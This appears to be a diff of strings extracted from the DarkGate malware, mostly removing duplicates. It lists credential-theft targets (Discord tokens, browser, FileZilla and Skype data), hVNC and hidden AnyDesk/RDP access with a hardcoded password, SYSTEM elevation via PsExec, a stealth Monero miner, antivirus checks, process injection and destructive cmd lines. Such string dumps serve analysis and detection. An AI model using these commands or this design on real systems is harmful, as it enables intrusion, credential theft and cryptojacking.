@@ -4,8 +4,6 @@ discord.exe
 {"token":"
 FileZilla\
 sitemanager.xml
-sitemanager.xml
-recentservers.xml
 recentservers.xml
 Mozilla\
 firefox.exe
@@ -15,20 +13,12 @@ cmd.exe
 firefox
 /c del /q /f /s 
 firefox\*
-cmd.exe
 Google
 chrome.exe
-/c cd /d "
 " && move Google google
-cmd.exe
-/c cd /d "
-" && move Google google
-cmd.exe
 Opera Software
 cookie
 opera.exe
-cookie
-virtualdesk
 virtualdesk
 C:\WINDOWS\system32\explorer.exe
 virtualdesk
@@ -57,27 +47,22 @@ Desktop
 USERPROFILE
 c:\temp\tmp
 c:\temp
-c:\temp
 :\
 C:\temp\
 .rar
 C:\temp\
 .rar
-C:\temp\
 cmd
-C:\temp\
 C:\Program Files\WinRAR\Rar.exe
 C:\Program Files (x86)\WinRAR\Rar.exe
 Rar.exe
 a -ep1 -r -y -v5m -m1 "
-.rar
 rar.exe
 cmd.exe
 No multiple files
 C:\*
 C:\Windows
 C:\Program Files
-C:\Windows
 *.*
 Chrome Legacy Window
 vchromeHandle
@@ -88,9 +73,6 @@ vchromeinternalPosY
 vchromeHandleInterno
 vchromeRectInternoH
 vchromeRectInternoW
-Chrome Legacy Window
-Chrome Legacy Window
-Chrome Legacy Window
 Google Chrome
 Brave
 Microsoft
@@ -98,19 +80,15 @@ hVNC phase 1
 Cleaning virtualdesk hVNC processes
 hVNC phase 2
  not found
- not found
-virtualdesk
 virtualdesk
 hVNC phase 3
 hVNC VirtualDesk Failed
-virtualdesk
 hVNC phase 4
 Google\Chrome\test
 Google\Chrome\User Data
 --user-data-dir="
 BraveSoftware\Brave-Browser\test
 BraveSoftware\Brave-Browser\User Data
---user-data-dir="
 Microsoft\Edge\test
 Microsoft\Edge\User Data
  --user-data-dir="
@@ -129,8 +107,6 @@ C:\Program Files (x86)\Google\Update\GoogleUpdate.exe
 C:\Program Files (x86)\BraveSoftware\Update\BraveUpdate.exe
 C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe
 C:\Program Files (x86)\Common Files\Microsoft Shared\ink\TabTip32.exe
-C:\Program Files (x86)\Google\Update\GoogleUpdate.exe
-C:\Program Files (x86)\BraveSoftware\Update\BraveUpdate.exe
 C:\Program Files (x86)\Internet Explorer\ielowutil.exe
 autoit3.exe
 appdata\local\temp
@@ -152,7 +128,6 @@ Updating by AU3 method... Bytes:
  Hash Data Update: 
 update
 Incorrect data bytes: 
- Hash Data Update: 
 No startup configured, skip update
 c:\
 /c ping 127.0.0.1 & del /q /f %s & rmdir /s /q %s exit
@@ -200,11 +175,8 @@ au3file
 Autoit3.exe
 AutoIt3EXEData nope
 U_Persistence.MainPEPathData nope
-Autoit3.exe
 /c shutdown -f -r -t 0
 cmd.exe
-pidgin.exe
-pidgin.exe
 pidgin.exe
 explorer
 update
@@ -213,7 +185,6 @@ veracrypt
 cmd.exe
 c:\temp\autoit3.exe
 c:\temp\
-c:\temp\autoit3.exe
 MessageBoxA
 SizeofResource
 LockResource
@@ -223,33 +194,22 @@ update
 \appdata\
 \appdata\local\temp\
 c:\temp
-c:\temp
 c:\temp\s
 appdata\local\temp
 data
 ruta.txt
-ruta.txt
-ruta.txt
-.lnk
 .lnk
 dec.txt
-.lnk
-.lnk
 .lnk
 I need Admin rights to elevate to SYSTEM
 Already Elevated to SYSTEM
 pidgin.exe
 c:\temp\
 c:\temp\Autoit3.exe
-c:\temp\
 SYSTEM Elevation: Cannot find Autoit3.exe
 c:\temp\pidgin.exe
-c:\temp\pidgin.exe
 SYSTEM Elevation: Cannot find Pidgin
-c:\temp\
-c:\temp\
 SYSTEM Elevation: Cannot find RAW PE
-c:\temp\PsExec.exe
 c:\temp\PsExec.exe
 cmd
 SYSTEM Elevation: Completed, new DarkGate connection with SYSTEM privileges, Executed from: 
@@ -257,19 +217,12 @@ Elevation: I already have admin rights
 pidgin.exe
 c:\temp\
 c:\temp\Autoit3.exe
-c:\temp\
 Elevation: Cannot find Autoit3.exe
-c:\temp\pidgin.exe
 c:\temp\pidgin.exe
 Elevation: Cannot find Pidgin
 Elevation: AT RAW STUB ELEVATION IS NOT AVAILABLE
 Elevation: ???
 Elevation target: 
-c:\temp\d.txt
-c:\temp\d.txt
-c:\temp\t.txt
-c:\temp\p.txt
-c:\temp\d.txt
 c:\temp\d.txt
 c:\temp\t.txt
 c:\temp\p.txt
@@ -277,8 +230,6 @@ Elevation: FAILURE
 9999
 Test_
 http
-Stub: WARNING: THESE NEW DOMAINS ARE NOT WORKING: 
-ORIGINAL DATA: 
 Stub: WARNING: THESE NEW DOMAINS ARE NOT WORKING: 
 ORIGINAL DATA: 
 Stub: Configuration updated: StubBytes: 
@@ -298,16 +249,12 @@ cmd.exe
  not exists
 target=
 Credentials detected, removing them!
-target=
-: 
 : 
 /c cmdkey /delete:
-cmd.exe
 All Credentials got Removed, Previous list of Credentials:
 |\/|
 Mail PassView
 MailPassView
-WebBrowserPassView
 WebBrowserPassView
 SysListView32
 cmd.exe 
@@ -326,13 +273,8 @@ ChromeCookiesView
 lol.exe /stext "
 skype.txt"
 skype.txt
-skype.txt
-skype.txt
 lol.exe /shtml "
 skype.txt"
-skype.txt
-skype.txt
-skype.txt
 skype.txt
 Yes
 domains
@@ -345,15 +287,8 @@ puerto
 version
 hwid
 domains
-domains
-notifications
-notifications
 notifications
 monero
-monero
-monero
-minerconfig
-minerconfig
 minerconfig
 startup
 rootkit
@@ -389,11 +324,8 @@ puerto
 vepoch
 paranoic
 C:\ProgramData
-C:\ProgramData
 msgdata_
 Yes
-|-|
-|-|
 |-|
 mainfolder
 C:\ProgramData\
@@ -415,23 +347,17 @@ KASPA
 NEXA
 AUTOLYKOS2
 C:\temp
-C:\temp
 MZ
  --threads=
   
 C:\temp\xmr.txt
 C:\temp\xmr
-C:\temp\xmr
-C:\temp\tr
 C:\temp\tr
 C:\temp\testdec.txt
 -o
 :3340 
-  
-  
 C:\temp\testgpudec.txt
 C:\temp\etc.txt
-C:\temp\etc
 C:\temp\etc
 Stub: Corrupted miner MZ, will redownload miner soon | Retry 
 Stub: Corrupted miner FilesDelimiter is missing, will redownload miner soon | Retry 
@@ -440,31 +366,20 @@ C:\darkgateminertest
 Stub: darkminertest! TimeToIDLE:
 Miner is waiting IDLE 
 Stub: Miner do not start because taskmanager is open!
-Stub: Miner do not start because taskmanager is open!
 Stub: Miner injected at Defrag.exe
 Stub: Miner has been killed because not IDLE
 CPU
-CPU
 CPU+GPU
 GPU
-GPU
-CPU
-CPU
-CPU
 Stub: Miner has been Downloaded -> Installing Miner 
 Stub: Miner installed and enabled / Elapsed: 
 C:\temp\id.txt
 Stub: Critical error in miner 0
 nominear
 C:\temp\xmr
-C:\temp\xmr
-C:\temp\etc
 C:\temp\etc
 C:\temp\tr
-C:\temp\tr
 C:\temp\xmr.txt
-C:\temp\xmr.txt
-C:\temp\etc.txt
 C:\temp\etc.txt
  x86
 nominear
@@ -477,7 +392,6 @@ standard vga graphics adapter
 microsoft basic display adapter
 virtual
 virtual
-virtual
 vmware
 Microsoft Hyper-V Video
 IsUserAnAdmin
@@ -487,15 +401,12 @@ SYSTEM
 Yes
 No
  x86
- x86
  x64
  x64
 ProductName
 SOFTWARE\Microsoft\Windows NT\CurrentVersion
 CSDVersion
-SOFTWARE\Microsoft\Windows NT\CurrentVersion
 CurrentBuildNumber
-SOFTWARE\Microsoft\Windows NT\CurrentVersion
 10
  Build 
 windows xp
@@ -519,8 +430,6 @@ C:\ProgramData\AVG
 AVG
 C:\ProgramData\Kaspersky Lab
 C:\Program Files (x86)\Kaspersky Lab
-C:\Program Files (x86)\Kaspersky Lab
-C:\Program Files (x86)\Kaspersky Lab
 KES
 Kaspersky EndPoint Security
 Kaspersky
@@ -531,9 +440,7 @@ Avira
 |ns.exe
 Norton
 |nis.exe
-Norton
 nortonsecurity.exe
-Norton
 |smc.exe
 Symantec
 uiseagnt.exe
@@ -541,7 +448,6 @@ Trend Micro
 mcshield.exe
 McAfee
 mcuicnt.exe
-McAfee
 superantispyware.exe
 SUPER AntiSpyware
 vkise.exe
@@ -549,7 +455,6 @@ Comodo
 |mbam.exe
 MalwareBytes
 |cis.exe
-Comodo
 bytefence.exe
 ByteFence
 sdscan.exe
@@ -563,7 +468,6 @@ IObit Malware Fighter
 psuaservice.exe
 Panda Security
 C:\Program Files\Malwarebytes
-MalwareBytes
 C:\ProgramData\Emsisoft
 Emsisoft
 C:\Program Files\Quick Heal
@@ -576,7 +480,6 @@ C:\ProgramData\G DATA
 G DATA
 Unknown
 No
-mainhw
 mainhw
 Yes
 No
@@ -595,12 +498,10 @@ cmd.exe
 ..
 *.*
 C:\Program Files
-C:\Program Files
 .0xCrypt
 *.*
 C:\Windows
 C:\Program Files
-C:\Windows
 .log
 .exe
 OPEN
@@ -618,7 +519,6 @@ TEMP
 C:\Users\
 \AppData\Local\Temp\
 C:\temp
-C:\temp
 C:\temp\
 NtAllocateVirtualMemory
 NtWriteVirtualMemory
@@ -628,9 +528,7 @@ InjectCustomShellcodeWithParamsAndSpoff failure
 InjectCustomShellcodeWithParams failure
 NtCreateThreadEx
 cmd.exe
-cmd.exe
 notepad.exe
-cmd.exe
 cmd.exe
 NtGetContextThread
 NtReadVirtualMemory
@@ -638,30 +536,18 @@ NtUnmapViewOfSection
 NtSetContextThread
 NtResumeThread
 NtTerminateProcess
-NtTerminateProcess
 NtFreeVirtualMemory
-NtTerminateProcess
 WINDIR
 C:\Windows\
 C:\windows\SysWOW64\notepad.exe
-C:\windows\SysWOW64\notepad.exe
-SysWOW64\notepad.exe
 SysWOW64\notepad.exe
 system32\notepad.exe
-system32\notepad.exe
-SysWOW64\systeminfo.exe
 SysWOW64\systeminfo.exe
 C:\Windows\System32\systeminfo.exe
 System32\systeminfo.exe
 C:\Windows\SysWOW64\systeminfo.exe
-C:\Windows\SysWOW64\systeminfo.exe
-C:\Windows\System32\systeminfo.exe
-C:\Windows\System32\systeminfo.exe
-Microsoft.NET\Framework\v2.0.50727\vbc.exe
 Microsoft.NET\Framework\v2.0.50727\vbc.exe
 Microsoft.NET\Framework\v4.0.30319\vbc.exe
-Microsoft.NET\Framework\v4.0.30319\vbc.exe
-Microsoft.NET\Framework\v2.0.50727\regasm.exe
 Microsoft.NET\Framework\v2.0.50727\regasm.exe
 Microsoft.NET\Framework\v4.0.30319\regasm.exe
 C:\windows\Microsoft.NET\Framework\v2.0.50727\regasm.exe
@@ -672,7 +558,6 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe
 notepad.exe 
 log
  @ 
-.log
 .log
 log
 :::Clipboard:::
@@ -736,7 +621,6 @@ SetThreadLocale
 cmd
 c:\windows\system32\cmd.exe
 cmd.exe
-c:\windows\system32\cmd.exe
 GetFileAttributesW
 GetFileAttributesA
 RegQueryValueExA
@@ -757,7 +641,6 @@ DeleteFileA
 Binder: no data
 cantidad
 Binder: cantidad not number
-cantidad
 data
 action
 parametros
@@ -765,8 +648,6 @@ nombres
 Binder: SpActions not number
 cmd.exe 
 Remote Desktop Connection
-#32770
-#32770
 #32770
 hAnyDesk Handle not found 0x00
 hRDP Handle found 0x00
@@ -777,47 +658,29 @@ Yes
 S
 Connect
 pidgin.exe
-pidgin.exe
 DarkGate not found to get executed on the new hAnyDesk Desktop, Did you enabled Startup option on builder?
 c:\temp\PsExec.exe
 c:\temp\PsExec.exe not found
 Executed: 
 \SafeMode -p darkgatepassword0
  -i 2 
-c:\temp\PsExec.exe
 c:\temp\anydesk.exe
 c:\temp\anydesk.exe not exists
 Starting Anydesk
-c:\temp\anydesk.exe
 Anydesk unable to start, desktop not ready? Waiting 5 seconds
 Anydesk started, reading config
 C:\Users\SafeMode\AppData\Roaming\AnyDesk\system.conf
 anydesk.exe
 C:\Users\SafeMode\AppData\Roaming\AnyDesk\system.conf Not exists, maybe desktop still not ready, waiting 45 seconds more...
-c:\temp\anydesk.exe
-anydesk.exe
-c:\temp\anydesk.exe
-anydesk.exe
-C:\Users\SafeMode\AppData\Roaming\AnyDesk\system.conf
-c:\temp\anydesk.exe
-Anydesk started, reading config
-C:\Users\SafeMode\AppData\Roaming\AnyDesk\system.conf
 For some reason AnyDesk app is not working, check inside SafeMode user for manual operations
 Anydesk Config loaded - Injecting DarkGate hAnydesk Config
 Anydesk.exe
 Restarting AnyDesk
-C:\Users\SafeMode\AppData\Roaming\AnyDesk\system.conf
 ad.anynet.id
 ad.anynet.id = "" waiting 20 second
-C:\Users\SafeMode\AppData\Roaming\AnyDesk\system.conf
 Invalid config hAnydeskGetInjectAbleConfig
-C:\Users\SafeMode\AppData\Roaming\AnyDesk\system.conf
-c:\temp\anydesk.exe
 Configuring hAnyDesk
-C:\Users\SafeMode\AppData\Roaming\AnyDesk\system.conf
 Error, unable to read config file
-hAnyDesk Config: 
-hAnyDesk Config: 
 hAnyDesk Config: 
 hAnyDesk Password: darkgatepassword0
 C:\temp\rdpwrap.ini
@@ -837,28 +700,10 @@ Execute powershell
 cmd.exe
 C:\Windows\System32\
 /c -NoProfile -ExecutionPolicy Bypass -Command "& { Set-Item WSMan:\localhost\Client\TrustedHosts -Value "127.0.0.2" -Concat
-cmd.exe
-C:\Windows\System32\
-/c -NoProfile -ExecutionPolicy Bypass -Command "& { Set-Item WSMan:\localhost\Client\TrustedHosts -Value "127.0.0.2" -Concat
-cmd.exe
-/c reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT" /v "Terminal Services" /t REG_SZ /d "" && exit
-cmd.exe
 /c 
-cmd.exe
-C:\Windows\System32\
 /c -NoProfile -ExecutionPolicy Bypass -Command "& { Set-ItemProperty -Path ""HKCU:\Software\Microsoft\Terminal Server Client
-cmd.exe
 /c reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services" /v "DisableRemoteDesktopAntiAlias" 
-cmd.exe
 /c reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services" /v "DisableSecuritySettings" /t RED
-cmd.exe
-/c reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services" /v "DisableRemoteDesktopAntiAlias" 
-cmd.exe
-/c reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services" /v "DisableSecuritySettings" /t RED
-cmd.exe
-C:\Windows\System32\
-/c -NoProfile -ExecutionPolicy Bypass -Command "& { Set-ItemProperty -Path ""HKCU:\Software\Microsoft\Terminal Server Client
-cmd.exe
 Injecting rdpwrap
 Special Injection failure
 extexport.exe
@@ -873,11 +718,9 @@ prompt for credentials:i:0
 c:\temp\test.rdp
 Execute test.rdp
 hanydesk
-hanydesk
 hAnyDesk VirtualDesk Failed
 AnyDesk
 c:\temp\AnyDesk.exe
-hanydesk
 C:\temp\
 c:\temp\test.rdp /v:127.0.0.2 /f /admin
 C:\Windows\System32\mstsc.exe
@@ -887,31 +730,18 @@ hAnyDeskConfirmLocalhRDP okay Starting hAnyDesk desktop, wait 30-60 seconds...
 C:\users\safemode
 For some reason it did not work, I will try 1 more time with a different config
 hAnyDesk: Failure
-C:\Program Files (x86)\Google\Update\GoogleUpdate.exe
-C:\Program Files (x86)\BraveSoftware\Update\BraveUpdate.exe
-C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe
 C:\Program Files (x86)\Common Files\Microsoft Shared\ink\TabTip32.exe
-c:\temp\
-c:\temp\
-c:\temp\
 c:\temp\
 Autoit3.exe
 zLAxuU0kQKf3sWE7ePRO
 c:\temp\
 .au3
-.au3
 c:\temp
-.au3
-.au3
 C:\
 Error data au3
 Cannot find .au3 script file 
 pidgin.exe
-pidgin.exe
-pidgin.exe
-pidgin.exe
 \pidgin-%s-dbgs
-pidgin.exe
 cannot find libssp 
 c:\debug
 c:\debug\data.bin
@@ -925,28 +755,21 @@ Corrupted config
 debug_config.txt
 4.14
 c:\temp\t.txt
-c:\temp\t.txt
 c:\temp\p.txt
 Elevation completed
 No
 c:\temp\crash.txt
 DarkGate has recovered from a Critical error
-c:\temp\crash.txt
 ok
 Add monitor: 
 Restart Process: 
  no |
  is not a number
- is not a number
- is not a number
 hAnyDesk Restarted
-anydesk.exe
-c:\temp\anydesk.exe
 anydesk.exe
 c:\temp\anydesk.exe
 hAnyDesk Executed as Admin
 Executing DarkGate inside the new desktop...
-anydesk.exe
 /c net user SafeMode /delete
 DELETE_HVNC_PROFILE
 Google\Chrome\test
@@ -965,13 +788,10 @@ PC_SHUTDOWN
 cmd.exe
 PC_RESTART
 /c shutdown -f -r -t 0
-cmd.exe
-cmd.exe
 uninstall
 /c del /q /f /s 
  && rmdir /s /q "
 " && rmdir /s /q c:\temp && del /q /f %temp%\*.vbs
-cmd.exe
 Miner Uninstalled
 Miner Restarted
 Reinstalling Miner
@@ -991,6 +811,4 @@ c:\temp\d.txt
 m1
 m2
 update
-update
-uninstall
 uninstall
